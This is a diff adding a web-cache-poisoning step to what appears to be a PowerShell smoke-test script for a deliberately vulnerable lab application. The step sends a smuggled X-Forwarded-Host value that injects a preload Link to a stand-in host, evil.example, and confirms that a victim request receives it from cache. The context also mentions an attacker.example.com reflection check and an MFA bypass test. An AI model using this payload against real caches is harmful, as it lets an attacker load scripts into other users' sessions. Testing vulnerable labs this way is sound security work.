@@ -274,6 +274,38 @@ $link = ''
 if ($r.Headers -and $r.Headers['Link']) { $link = [string]$r.Headers['Link'] }
 Check 'Link header reflects attacker host' ($link -match 'attacker\.example\.com')
 
+# Real web-cache poisoning through the misconfigured cache on :8001 (this
+# service only runs under `docker compose up`; skip cleanly if it is absent).
+$cacheBase = $Base -replace ':3001', ':8001'
+$cacheUp = $false
+try {
+    $null = Invoke-WebRequest -Uri ($cacheBase + '/login') -UseBasicParsing -TimeoutSec 3 -ErrorAction Stop
+    $cacheUp = $true
+} catch { $cacheUp = ($null -ne $_.Exception.Response) }
+if (-not $cacheUp) {
+    Write-Host '  [SKIP] :8001 cache not running (docker compose only)' -ForegroundColor DarkGray
+} else {
+    $poisonUri = $cacheBase + '/admin?smoke=cachepoison'
+    $poisonXfh = 'evil.example/x>; rel="preload"; as="script"</bait'
+    # 1. Prime the cache from an authenticated session with a poisoned XFH.
+    $null = Invoke-WebRequest -Uri $poisonUri -WebSession $julie `
+        -Headers @{ 'X-Forwarded-Host' = $poisonXfh } `
+        -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue
+    # 2. Victim (no session, no XFH) fetches the same path -> served from cache.
+    $victim = $null
+    try {
+        $victim = Invoke-WebRequest -Uri $poisonUri -UseBasicParsing `
+            -MaximumRedirection 0 -ErrorAction SilentlyContinue
+    } catch { $victim = $_.Exception.Response }
+    $xcache = ''; $cLink = ''
+    if ($victim -and $victim.Headers) {
+        if ($victim.Headers['X-Cache']) { $xcache = [string]$victim.Headers['X-Cache'] }
+        if ($victim.Headers['Link'])    { $cLink  = [string]$victim.Headers['Link'] }
+    }
+    Check ':8001 cache serves the poisoned Link from cache (X-Cache HIT)' `
+        (($xcache -match 'HIT') -and ($cLink -match 'evil\.example'))
+}
+
 Write-Host ''
 Write-Host '--- 19 MFA bypass success=true ---' -ForegroundColor Cyan
 # Register a fresh user, log them in, enable MFA via mass-assignment PUT,
